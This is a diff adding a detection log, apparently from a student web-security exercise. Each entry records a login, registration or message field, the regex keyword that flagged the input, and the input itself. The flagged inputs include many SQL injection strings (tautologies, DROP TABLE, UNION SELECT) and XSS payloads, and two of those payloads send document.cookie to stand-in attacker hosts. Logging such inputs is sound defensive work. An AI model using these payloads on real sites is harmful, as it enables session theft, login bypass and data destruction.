@@ -1,0 +1,1200 @@
+Input string from: 8080:register_username
+Attack word: ' +or
+Input string: abc' or '1' = '1
+
+Input string from: 8080:register_username
+Attack word: ' +or
+Input string: abc' or '1' = '1
+
+Input string from: 8080:register_username
+Attack word: ' *\) *;
+Input string: abc', 'anyvalue' ); Select * From User
+
+Input string from: 8080:register_username
+Attack word: ' *\) *;
+Input string: abc', 'anyvalue' ); Select * From User 
+
+Input string from: 8080:register_username
+Attack word: ' *\) *;
+Input string: abc', 'anyvalue' ); Select * From User 
+
+Input string from: 8080:register_username
+Attack word: ' +or
+Input string: abc' or '1' = '1
+
+Input string from: 8080:post_message_massage_content_from_user: attacker
+Attack word: ' *\) *;
+Input string: <script>javascript:alert(âExecuted!');<script>
+
+Input string from: 8080:login_username
+Attack word: < *script
+Input string: <script>jav
+
+Input string from: 80:login_username
+Attack word: < *script
+Input string: <script>alert("1")</script>
+
+Input string from: 80:register_username
+Attack word: ' +or
+Input string: abc' or '1' = '1
+
+Input string from: 80:register_username
+Attack word: ' *\) *;
+Input string: "><script>alert('hello from group 5 :)');</script>
+
+Input string from: 80:register_password
+Attack word: ' *\) *;
+Input string: "><script>alert('hello from group 5 :)');</script>
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: "><script>alert('hello from group 5')</script>
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: ><script>alert`1`</script>
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: "><script>alert(1)</script>
+
+Input string from: 80:login_username
+Attack word: ' *\) *;
+Input string: test'); DROP TABLE Users; --
+
+Input string from: 80:login_username
+Attack word: ' *\) *;
+Input string: test');
+
+Input string from: 80:register_password
+Attack word: ' *\) *;
+Input string: '); DROP TABLE Users; --
+
+Input string from: 80:post_message_massage_content_from_user: Hello123
+Attack word: ' *\) *;
+Input string: '); DROP TABLE USERS; --
+
+Input string from: 80:login_username
+Attack word: < *script
+Input string: <script>
+
+Input string from: 80:login_password
+Attack word: < *script
+Input string: <script>
+
+Input string from: 80:login_username
+Attack word: ' *\) *;
+Input string: '); DROP TABLE Users;--
+
+Input string from: 80:login_password
+Attack word: ' *\) *;
+Input string: '); DROP TABLE Users;--
+
+Input string from: 80:post_message_recipientname_from_user: voter
+Attack word: < *script
+Input string: <script>
+
+Input string from: 80:post_message_massage_content_from_user: voter
+Attack word: < *script
+Input string: <script>
+
+Input string from: 80:post_message_massage_content_from_user: admin
+Attack word: ' *\) *;
+Input string: '); DROP TABLE Users;--
+
+Input string from: 80:post_message_massage_content_from_user: admin
+Attack word: ' *\) *;
+Input string: "<script>window.alert('xss');</script>
+
+Input string from: 80:post_message_massage_content_from_user: admin
+Attack word: < *script
+Input string: "<script>window.alert('xss')</script>
+
+Input string from: 80:post_message_massage_content_from_user: admin
+Attack word: < *script
+Input string: <script>window.alert('xss')</script>
+
+Input string from: 80:post_message_massage_content_from_user: admin
+Attack word: < *script
+Input string: \<script>window.alert('xss')</script>
+
+Input string from: 80:post_message_massage_content_from_user: admin
+Attack word: < *script
+Input string: <script>
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>Alan was here</script>
+
+Input string from: 80:post_message_massage_content_from_user: Scholar
+Attack word: < *script
+Input string: <script>Alan was here</script>
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or '1' = '1
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or '1' = '1
+
+Input string from: 80:register_password
+Attack word: ;
+Input string: ; drop All tables; --
+
+Input string from: 80:register_password
+Attack word: ;
+Input string: ; drop All tables; --
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or '1' = '1
+
+Input string from: 80:register_password
+Attack word: or
+Input string: password
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or '1' = '1
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or '1' = '1
+
+Input string from: 80:register_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:post_message_recipientname_from_user: blue
+Attack word: admin
+Input string: admin
+
+Input string from: 80:post_message_recipientname_from_user: blue
+Attack word: ;
+Input string: SELECT * FROM users WHERE name = ''; DROP TABLE Users -- AND pass = '';
+
+Input string from: 80:post_message_massage_content_from_user: blue
+Attack word: ;
+Input string: SELECT * FROM users WHERE name = ''; DROP TABLE Users -- AND pass = '';
+
+Input string from: 80:post_message_recipientname_from_user: blue
+Attack word: < *script
+Input string: <script>test
+
+Input string from: 80:post_message_massage_content_from_user: blue
+Attack word: -
+Input string: ^([a-zA-Z0-9])(([\-.]|[_]+)
+
+Input string from: 80:post_message_massage_content_from_user: blue
+Attack word: -
+Input string: ^(([a-z])+.)+[A-Z]([a-z])+$
+
+Input string from: 80:login_username
+Attack word: -
+Input string: ^(([a-z])+.)+[A-Z]([a-z])+$
+
+Input string from: 80:register_username
+Attack word: -
+Input string: ^(([a-z])+.)+[A-Z]([a-z])+$
+
+Input string from: 80:login_username
+Attack word: -
+Input string: ^(([a-z])+.)+[A-Z]([a-z])+$
+
+Input string from: 80:login_username
+Attack word: -
+Input string: ^(([a-z])+.)+[A-Z]([a-z])+
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>window.alert("Wow")</script>
+
+Input string from: 80:register_password
+Attack word: < *script
+Input string: <script>window.alert("Wow")</script>
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>window.alert("Wow")</script>
+
+Input string from: 80:register_password
+Attack word: < *script
+Input string: <script>window.alert("Wow")</script>
+
+Input string from: 80:register_password
+Attack word: or
+Input string: Password1
+
+Input string from: 80:post_message_recipientname_from_user: billy
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_password
+Attack word: or
+Input string: Password123
+
+Input string from: 80:register_username
+Attack word: ,
+Input string: ,
+
+Input string from: 80:register_username
+Attack word: \\
+Input string: \
+
+Input string from: 80:register_username
+Attack word: /
+Input string: /
+
+Input string from: 80:login_username
+Attack word: ;
+Input string: OR 1=1; DROP TABLES;
+
+Input string from: 80:login_password
+Attack word: or
+Input string: password1
+
+Input string from: 80:register_password
+Attack word: or
+Input string: Password123
+
+Input string from: 80:register_password
+Attack word: or
+Input string: Password123
+
+Input string from: 80:register_password
+Attack word: or
+Input string: Password123
+
+Input string from: 80:post_message_massage_content_from_user: Ben
+Attack word: ;
+Input string: ; DROP TABLE;
+
+Input string from: 80:post_message_massage_content_from_user: Ben
+Attack word: ;
+Input string: "><SCRIPT>var+img=new+Image();img.src="http://hacker/" + document.cookie;</SCRIPT>
+
+Input string from: 80:post_message_massage_content_from_user: Ben
+Attack word: < *script
+Input string: <script>
+
+Input string from: 80:login_password
+Attack word: or
+Input string: mypassword
+
+Input string from: 80:login_username
+Attack word: or
+Input string: SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' 
+
+Input string from: 80:login_password
+Attack word: or
+Input string: Passwordiscool
+
+Input string from: 80:login_username
+Attack word: ;
+Input string: 10;DROP members --
+
+Input string from: 80:login_password
+Attack word: ;
+Input string: SELECT * FROM products WHERE id = 10; DROP members--
+
+Input string from: 80:login_username
+Attack word: ' +or
+Input string: ' or ' 1=1
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or ' 1=1
+
+Input string from: 80:login_username
+Attack word: ' +or
+Input string: ' or '1'='1
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or '1'='1
+
+Input string from: 80:login_username
+Attack word: ' +or
+Input string: 1' or 1=1 -- -
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: admin
+Input string: info2222admin
+
+Input string from: 80:login_username
+Attack word: or
+Input string: or 1=1
+
+Input string from: 80:login_username
+Attack word: or
+Input string: or 1=1--
+
+Input string from: 80:login_username
+Attack word: or
+Input string: or 1=1
+
+Input string from: 80:login_username
+Attack word: or
+Input string: or 1=1/*
+
+Input string from: 80:login_username
+Attack word: -
+Input string: admin' --
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin' 
+
+Input string from: 80:login_username
+Attack word: \*
+Input string: admin'/*
+
+Input string from: 80:login_username
+Attack word: ' +or
+Input string: admin' or '1'='1
+
+Input string from: 80:login_username
+Attack word: ' +or
+Input string: admin' or '1'='1
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: admin' or '1'='1
+
+Input string from: 80:login_username
+Attack word: ,
+Input string: 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+
+Input string from: 80:login_username
+Attack word: ,
+Input string: 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+
+Input string from: 80:login_password
+Attack word: ,
+Input string: 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or 1=1--
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: or
+Input string: " or 1=1--
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: or
+Input string: or 1=1--
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or 'a'='a
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: or
+Input string: " or "a"="a
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: or
+Input string: ') or ('a'='a
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: or
+Input string: ") or ("a"="
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: or
+Input string: 'or 1--
+
+Input string from: 80:login_password
+Attack word: or
+Input string: 'or 1--
+
+Input string from: 80:login_username
+Attack word: or
+Input string: < img src=x onerror=alert(1) >
+
+Input string from: 80:login_password
+Attack word: or
+Input string: < img src=x onerror=alert(1) >
+
+Input string from: 80:login_username
+Attack word: <
+Input string: < img src=x
+
+Input string from: 80:login_password
+Attack word: <
+Input string: < img src=x
+
+Input string from: 80:post_message_massage_content_from_user: asdfmovie
+Attack word: or
+Input string: < img src=x onerror=alert(1)
+
+Input string from: 80:post_message_massage_content_from_user: asdfmovie
+Attack word: <
+Input string: < IMG SRC=x ONERROR=alert(1)
+
+Input string from: 80:banuser_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>alert("in")</script>
+
+Input string from: 80:register_password
+Attack word: < *script
+Input string: <script>alert("in")</script>
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>alert("in")</script>
+
+Input string from: 80:register_password
+Attack word: < *script
+Input string: <script>alert("in")</script>
+
+Input string from: 80:register_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: < *script
+Input string: <script>alert("in")</script>
+
+Input string from: 80:login_password
+Attack word: < *script
+Input string: <script>alert("in")</script>
+
+Input string from: 80:register_password
+Attack word: ;
+Input string: ; drop all Tables; --
+
+Input string from: 80:post_message_massage_content_from_user: anotheruser
+Attack word: \\
+Input string: Message content \\\\\\\\
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:post_message_recipientname_from_user: billy
+Attack word: admin
+Input string: admin
+
+Input string from: 80:post_message_recipientname_from_user: billy
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>window.alert("Hello!")</script>billy
+
+Input string from: 80:login_username
+Attack word: ;
+Input string: ; DROP TABLE Users--
+
+Input string from: 80:register_username
+Attack word: ;
+Input string: ;
+
+Input string from: 80:login_username
+Attack word: \*
+Input string: *
+
+Input string from: 80:login_username
+Attack word: "
+Input string: " 
+
+Input string from: 80:login_username
+Attack word: "
+Input string: "
+
+Input string from: 80:login_password
+Attack word: "
+Input string: "
+
+Input string from: 80:login_password
+Attack word: "
+Input string: "
+
+Input string from: 80:login_password
+Attack word: or
+Input string: password123
+
+Input string from: 80:register_password
+Attack word: or
+Input string: password123
+
+Input string from: 80:login_password
+Attack word: or
+Input string: password123
+
+Input string from: 80:post_message_recipientname_from_user: asdasd
+Attack word: admin
+Input string: admin
+
+Input string from: 80:post_message_recipientname_from_user: asdasd
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or '1' = '1
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>alert("in")</script>
+
+Input string from: 80:register_password
+Attack word: < *script
+Input string: <script>alert("in")</script>
+
+Input string from: 80:register_password
+Attack word: ;
+Input string: ;drop all tables; --
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or '1' = '1
+
+Input string from: 80:login_password
+Attack word: ;
+Input string: ;
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>alert("in")</script>
+
+Input string from: 80:login_username
+Attack word: or
+Input string: 'or 1--
+
+Input string from: 80:login_password
+Attack word: or
+Input string: 'or 1--
+
+Input string from: 80:login_username
+Attack word: ,
+Input string: 'union select 1, 2 --
+
+Input string from: 80:login_password
+Attack word: ,
+Input string: 'union select 1, 2 --
+
+Input string from: 80:login_username
+Attack word: ,
+Input string: 'union select 1, 2 --
+
+Input string from: 80:login_username
+Attack word: or
+Input string: '/**/or 1--
+
+Input string from: 80:login_username
+Attack word: or
+Input string: '/**/or''='
+
+Input string from: 80:login_username
+Attack word: or
+Input string: '/**/or/**/''/**/=/**/'
+
+Input string from: 80:login_username
+Attack word: or
+Input string: '/**/or/**/''/**/=/**/
+
+Input string from: 80:login_username
+Attack word: or
+Input string: '/**/or/**/'a'/**/=/**/'a
+
+Input string from: 80:login_username
+Attack word: or
+Input string: admin'/**/or/**/'a'/**/=/**/'a
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin'
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin'a
+
+Input string from: 80:login_username
+Attack word: or
+Input string: '/********/or/*****/1--a
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: or
+Input string: password
+
+Input string from: 80:login_username
+Attack word: -
+Input string: ' OR 1 --
+
+Input string from: 80:login_password
+Attack word: or
+Input string: password12
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_password
+Attack word: or
+Input string: password
+
+Input string from: 80:register_password
+Attack word: or
+Input string: password
+
+Input string from: 80:login_password
+Attack word: or
+Input string: password
+
+Input string from: 80:login_password
+Attack word: or
+Input string: Passwordpeople1
+
+Input string from: 80:login_username
+Attack word: or
+Input string: " or ""="
+
+Input string from: 80:login_password
+Attack word: or
+Input string: " or ""="
+
+Input string from: 80:register_username
+Attack word: -
+Input string: <!--
+
+Input string from: 80:login_username
+Attack word: -
+Input string: <!--
+
+Input string from: 80:register_username
+Attack word: -
+Input string: <!--
+
+Input string from: 80:register_password
+Attack word: -
+Input string: <!--
+
+Input string from: 80:register_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_password
+Attack word: admin
+Input string: adminadmin
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>window.alert("Hello!")</script>
+
+Input string from: 80:post_message_massage_content_from_user: hello
+Attack word: < *script
+Input string: <script>window.alert("Hello!")</script>
+
+Input string from: 80:post_message_recipientname_from_user: hello
+Attack word: =
+Input string: ' OR ''='
+
+Input string from: 80:post_message_massage_content_from_user: hello
+Attack word: =
+Input string: ' OR '1'='1
+
+Input string from: 80:post_message_massage_content_from_user: hello
+Attack word: =
+Input string: ' OR '2'='2
+
+Input string from: 80:login_username
+Attack word: =
+Input string: ' OR 'hello' = 'hello'
+
+Input string from: 80:login_password
+Attack word: =
+Input string: ' OR 'hello' = 'hello'
+
+Input string from: 80:login_username
+Attack word: =
+Input string: ' OR "hello" = "hello"
+
+Input string from: 80:login_password
+Attack word: =
+Input string: ' OR "hello" = "hello"
+
+Input string from: 80:login_username
+Attack word: =
+Input string: 105 OR 1=1
+
+Input string from: 80:login_password
+Attack word: =
+Input string: 105 OR 1=1
+
+Input string from: 80:login_username
+Attack word: or
+Input string: " or ""="
+
+Input string from: 80:login_password
+Attack word: or
+Input string: " or ""="
+
+Input string from: 80:login_username
+Attack word: ;
+Input string: 105; DROP TABLE Suppliers
+
+Input string from: 80:login_password
+Attack word: ;
+Input string: ';
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or 'a' like 'a
+
+Input string from: 80:login_password
+Attack word: ' +or
+Input string: ' or 'a' like 'a
+
+Input string from: 80:login_password
+Attack word: or
+Input string: 'or'a'like'a
+
+Input string from: 80:login_password
+Attack word: ;
+Input string: ';
+
+Input string from: 80:login_password
+Attack word: or
+Input string: password
+
+Input string from: 80:login_password
+Attack word: or
+Input string: password
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>var+i=new+Image();i.src="http://attacker.site/cookie?value="+document.cookie;</script>
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: or
+Input string: administrator
+
+Input string from: 80:login_username
+Attack word: or
+Input string: administrator
+
+Input string from: 80:login_password
+Attack word: or
+Input string: administrator
+
+Input string from: 80:login_password
+Attack word: or
+Input string: administrator
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_password
+Attack word: or
+Input string: password123
+
+Input string from: 80:login_username
+Attack word: ' +or
+Input string: ' or 1=1 --
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>alert("Dootydoot")</script>
+
+Input string from: 80:register_username
+Attack word: < *script
+Input string: <script>alert("Dootydoot")</script>
+
+Input string from: 80:register_username
+Attack word: >
+Input string: <svg/onload=alert('XSS')>
+
+Input string from: 80:register_password
+Attack word: >
+Input string: <svg/onload=alert('XSS')>
+
+Input string from: 80:register_username
+Attack word: >
+Input string: <svg/onload=alert('XSS')>
+
+Input string from: 80:register_username
+Attack word: >
+Input string: <svg/onload=alert('doot')>
+
+Input string from: 80:register_username
+Attack word: or
+Input string: Password
+
+Input string from: 80:register_password
+Attack word: or
+Input string: Password
+
+Input string from: 80:register_username
+Attack word: or
+Input string: Password1
+
+Input string from: 80:register_password
+Attack word: or
+Input string: Password1
+
+Input string from: 80:register_username
+Attack word: or
+Input string: Password123
+
+Input string from: 80:register_password
+Attack word: or
+Input string: Password123
+
+Input string from: 80:post_message_massage_content_from_user: Admin123
+Attack word: < *script
+Input string: <script>alert("doot")</script>
+
+Input string from: 80:post_message_massage_content_from_user: Admin123
+Attack word: >
+Input string: <svg/onload=alert('XSS')>
+
+Input string from: 80:register_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_username
+Attack word: or
+Input string: x=alert;x(/xssor/.source);
+
+Input string from: 80:register_password
+Attack word: or
+Input string: x=alert;x(/xssor/.source);
+
+Input string from: 80:register_username
+Attack word: or
+Input string: x=alert;x(/xssor/.source);
+
+Input string from: 80:register_password
+Attack word: or
+Input string: x=alert;x(/xssor/.source);
+
+Input string from: 80:post_message_massage_content_from_user: blue
+Attack word: or
+Input string: x=alert;x(/xssor/.source);
+
+Input string from: 80:post_message_recipientname_from_user: blue
+Attack word: ' *\) *;
+Input string: <IMG SRC="javascript:alert('XSS');">
+
+Input string from: 80:post_message_massage_content_from_user: blue
+Attack word: ' *\) *;
+Input string: <IMG SRC="javascript:alert('XSS');">
+
+Input string from: 80:post_message_recipientname_from_user: blue
+Attack word: or
+Input string: <img src=x onerror="&
+
+Input string from: 80:post_message_massage_content_from_user: blue
+Attack word: or
+Input string: <img src=x onerror="&
+
+Input string from: 80:post_message_recipientname_from_user: blue
+Attack word: <
+Input string: <IMG SRC=&
+
+Input string from: 80:post_message_massage_content_from_user: blue
+Attack word: <
+Input string: <IMG SRC=&
+
+Input string from: 80:post_message_recipientname_from_user: blue
+Attack word: -
+Input string: ^(([a-z])+.)+[A-Z]([a-z])+$
+
+Input string from: 80:post_message_massage_content_from_user: blue
+Attack word: -
+Input string: ^(([a-z])+.)+[A-Z]([a-z])+$
+
+Input string from: 80:login_username
+Attack word: -
+Input string: ^(([a-z])+.)+[A-Z]([a-z])+$
+
+Input string from: 80:login_username
+Attack word: -
+Input string: ^(([a-z])+.)+[A-Z]([a-z])+$
+
+Input string from: 80:login_username
+Attack word: -
+Input string: ^(([a-z])+.)+[A-Z]([a-z])+$
+
+Input string from: 80:post_message_massage_content_from_user: aA1aA1aA1aA1
+Attack word: < *script
+Input string: ><script alert`1`></script>
+
+Input string from: 80:post_message_massage_content_from_user: aA1aA1aA1aA1
+Attack word: >
+Input string: >
+
+Input string from: 80:post_message_massage_content_from_user: aA1aA1aA1aA1
+Attack word: ' *\) *;
+Input string: ');
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: admin
+Input string: admin
+
+Input string from: 80:post_message_recipientname_from_user: aaaAAA222
+Attack word: admin
+Input string: admin
+
+Input string from: 80:post_message_massage_content_from_user: aaaAAA222
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: admin
+Input string: admin
+
+Input string from: 80:register_username
+Attack word: admin
+Input string: admin123
+
+Input string from: 80:register_password
+Attack word: admin
+Input string: admin123
+
+Input string from: 80:register_username
+Attack word: admin
+Input string: admin123
+
+Input string from: 80:register_password
+Attack word: admin
+Input string: admin123
+
+Input string from: 80:register_username
+Attack word: admin
+Input string: admin123
+
+Input string from: 80:register_password
+Attack word: admin
+Input string: admin123
+
+Input string from: 80:post_message_recipientname_from_user: admin
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: -
+Input string: huzqup-2zadfi-nyDkoj
+
+Input string from: 80:login_username
+Attack word: ;
+Input string: ;;;;;;
+
+Input string from: 80:login_password
+Attack word: -
+Input string: vutdyb-micvoD-kivri3
+
+Input string from: 80:register_username
+Attack word: or
+Input string: <iframe src="http://www.edstem.org"/>
+
+Input string from: 80:login_password
+Attack word: or
+Input string: password
+
+Input string from: 80:register_password
+Attack word: or
+Input string: password123
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: or
+Input string: 'or'1'='1
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: admin
+Input string: admin123
+
+Input string from: 80:post_message_massage_content_from_user: haha
+Attack word: <
+Input string: <img src="http://bank.com/transfer.do
+
+Input string from: 80:post_message_recipientname_from_user: haha
+Attack word: <
+Input string: <img src="http://bank.com/transfer.do
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: admin
+Input string: admin123
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: or
+Input string: " or ""="
+
+Input string from: 80:login_password
+Attack word: >
+Input string: <input name="username" type="text" placeholder="Username">
+
+Input string from: 80:login_username
+Attack word: admin
+Input string: admin
+
+Input string from: 80:login_password
+Attack word: admin
+Input string: admin
+
+Input string from: 80:post_message_recipientname_from_user: aaaAAA222
+Attack word: admin
+Input string: admin
+
+Input string from: 80:post_message_recipientname_from_user: admin
+Attack word: admin
+Input string: admin
+
+Input string from: 80:post_message_recipientname_from_user: admin
+Attack word: admin
+Input string: admin
+
+Input string from: 80:post_message_recipientname_from_user: Group5Demo
+Attack word: admin
+Input string: admin
+
